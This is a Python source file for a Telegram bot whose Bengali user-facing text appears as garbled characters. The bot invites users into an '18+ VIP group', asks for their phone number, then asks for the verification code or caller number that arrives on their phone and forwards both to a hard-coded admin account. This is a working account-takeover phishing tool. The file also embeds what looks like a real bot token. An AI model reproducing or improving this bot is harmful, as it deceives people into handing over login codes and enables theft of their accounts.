from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
)
from datetime import datetime

# --- Conversation Step Numbers ---
ASK_PHONE, ASK_CODE = range(2)

# --- ‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ Telegram Bot Token ---
BOT_TOKEN = "8108498513:AAE07KwMa5MkiBQbn7ZDsDsSFyAH69C_uGc"

# --- ‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ Telegram Admin ID ---
ADMIN_ID = 6588434606

# --- /start command handler ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [["‡¶π‡ßç‡¶Ø‡¶æ‡¶Å", "‡¶®‡¶æ"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    await update.message.reply_text(
        "‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡¶ø ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡ßß‡ßÆ+ VIP ‡¶ó‡ßç‡¶∞‡ßÅ‡¶™‡ßá ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶π‡¶§‡ßá ‡¶ö‡¶æ‡¶®?", reply_markup=reply_markup
    )
    return ASK_PHONE

# --- ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ‡¶´‡ßã‡¶® ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ---
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "‡¶π‡ßç‡¶Ø‡¶æ‡¶Å":
        await update.message.reply_text("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶®:")
        return ASK_CODE
    else:
        await update.message.reply_text("‡¶†‡¶ø‡¶ï ‡¶Ü‡¶õ‡ßá, ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶‡•§")
        return ConversationHandler.END

# --- ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ï‡ßã‡¶°/‡¶ï‡¶≤ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶®‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ---
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['phone'] = phone

    await update.message.reply_text(
        "‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶ï‡ßã‡¶° ‡¶Ø‡¶æ‡¶¨‡ßá ‡¶Ö‡¶•‡¶¨‡¶æ ‡¶è‡¶ï‡¶ü‡¶ø ‡¶ï‡¶≤ ‡¶Ü‡¶∏‡¶¨‡ßá‡•§\n"
        "‡¶Ø‡¶¶‡¶ø ‡¶ï‡ßã‡¶° ‡¶Ü‡¶∏‡ßá ‡¶§‡¶æ‡¶π‡¶≤‡ßá ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶¶‡¶ø‡¶®, ‡¶Ü‡¶∞ ‡¶Ø‡¶¶‡¶ø ‡¶ï‡¶≤ ‡¶Ü‡¶∏‡ßá ‡¶§‡¶æ‡¶π‡¶≤‡ßá ‡¶Ø‡ßá ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶•‡ßá‡¶ï‡ßá ‡¶ï‡¶≤ ‡¶Ü‡¶∏‡¶¨‡ßá ‡¶∏‡ßá‡¶ü‡¶ø ‡¶¶‡¶ø‡¶®‡•§"
    )
    return_code_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, collect_data)
    context.application.add_handler(return_code_handler, 1)
    return 2

# --- ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶°‡ßá‡¶ü‡¶æ ‡¶è‡¶°‡¶Æ‡¶ø‡¶®‡¶ï‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ---
async def collect_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code_or_call = update.message.text
    phone = context.user_data.get('phone', '‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø')

    message = (
        f"üì• ‡¶®‡¶§‡ßÅ‡¶® ‡ßß‡ßÆ+ VIP ‡¶∞‡¶ø‡¶ï‡ßã‡¶Ø‡¶º‡ßá‡¶∏‡ßç‡¶ü\n"
        f"üìû ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞: {phone}\n"
        f"üîë ‡¶ï‡ßã‡¶°/‡¶ï‡¶≤ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞: {code_or_call}\n"
        f"üïí ‡¶∏‡¶Æ‡¶Ø‡¶º: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

    await context.bot.send_message(chat_id=ADMIN_ID, text=message)
    await update.message.reply_text("‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶! ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®, ‡¶Ü‡¶™‡¶®‡¶æ‡¶ï‡ßá ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡ßß‡ßÆ+ VIP ‡¶ó‡ßç‡¶∞‡ßÅ‡¶™‡ßá ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá‡•§")
    return ConversationHandler.END

# --- /cancel command ---
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶∞‡ßã‡¶ß ‡¶¨‡¶æ‡¶§‡¶ø‡¶≤ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§")
    return ConversationHandler.END

# --- ‡¶¨‡¶ü ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ï‡ßã‡¶° ---
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == '__main__':
    main()
